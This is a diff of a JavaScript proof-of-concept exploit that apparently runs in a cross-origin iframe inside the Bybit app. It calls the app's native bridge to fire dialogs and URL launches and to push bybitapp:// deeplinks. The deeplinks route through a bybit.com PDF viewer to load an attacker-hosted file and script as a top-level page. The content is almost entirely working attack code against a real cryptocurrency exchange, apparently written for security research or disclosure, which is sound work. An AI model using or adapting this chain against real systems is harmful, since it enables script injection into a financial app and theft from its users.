@@ -8,19 +8,18 @@ function call(m,f,p){
     moduleName:m, methodName:f, uniqueId:"if_"+f+"_"+Math.random().toString(36).slice(2), params:p||{}}));
 }
 report("alive origin="+location.origin);
-// ACTION 1: native dialog, rendered by the app itself. Visible on a screenshot.
+// Router's parameter is 'path' (binary: "Missing path parameter" [pp+0x61a68]).
+// Push a deeplink that loads the attacker's own script as a NEW TOP-LEVEL on bybit.com.
+var VIEWER = "https://www.bybit.com/fiat/app/pages/pdf.html?path=" +
+  encodeURIComponent("https://cdn.jsdelivr.net/gh/davidxbors/pdfjs-render-testcase@687607130f2a5059d5319bef067f07f66f9b9f76/poc.pdf");
+var DEEP = "bybitapp://open/web?url=" + encodeURIComponent(VIEWER);
 setTimeout(function(){
-  try{ call("AlertDialog","showAlert",{title:"Bybit Security",
-        content:"NATIVE DIALOG SUMMONED BY A CROSS-ORIGIN IFRAME ("+location.hostname+")",
-        confirmTitle:"OK", cancelTitle:"Cancel"})
-      .then(r=>report("showAlert promise="+JSON.stringify(r))).catch(e=>report("showAlert err="+e));
-      report("showAlert dispatched"); }catch(e){ report("showAlert throw="+e); }
+  [["push",{path:DEEP}],["push",{path:DEEP,url:DEEP}],["replace",{path:DEEP}]].forEach(function(sp,i){
+    setTimeout(function(){
+      try{ call("Router",sp[0],sp[1]).then(r=>report("Router."+sp[0]+" promise="+JSON.stringify(r)))
+             .catch(e=>report("Router."+sp[0]+" err="+e));
+           report("Router."+sp[0]+" dispatched shape"+i); }catch(e){ report("throw "+e); }
+    }, i*2500);
+  });
 },2500);
-// ACTION 2: drive the device browser. Observable over CDP, off the WebView entirely.
-setTimeout(function(){
-  try{ call("UrlLauncher","open",{url:"http://127.0.0.1:9/IFRAME_ACTION#origin="+encodeURIComponent(location.origin),
-        externalApplication:true})
-      .then(r=>report("urlLauncher promise="+JSON.stringify(r))).catch(e=>report("urlLauncher err="+e));
-      report("urlLauncher dispatched"); }catch(e){ report("urlLauncher throw="+e); }
-},7000);
 </script></body>
